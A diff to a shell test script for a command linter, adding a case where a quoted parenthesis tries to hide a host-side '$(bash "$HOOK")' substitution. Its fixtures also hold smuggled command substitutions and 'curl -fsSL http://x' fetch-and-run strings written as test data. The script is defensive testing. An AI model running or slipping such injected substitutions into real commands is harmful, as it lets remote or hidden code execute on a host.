@@ -172,6 +172,10 @@ for host in '$(bash "$HOOK")' '`bash "$HOOK"`'; do
         bad "host-side substitution after the delimiter accepted: $host"
     else ok "host-side substitution after the delimiter rejected: $host"; fi
 done
+# A quoted parenthesis must not balance a substitution that still runs on the host.
+# shellcheck disable=SC2016
+printf '%s -- bash x "$(printf '"'"')'"'"')$(bash "$HOOK")"\n' "$WRAP" > "$SHELL_FIXTURE"
+if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'quoted parenthesis hides a host-side substitution'; else ok 'quoted parenthesis does not hide a host-side substitution'; fi
 # Single-quoted payload text is data (line copied from test-block-destructive-commands-d.sh).
 # shellcheck disable=SC2016
 printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
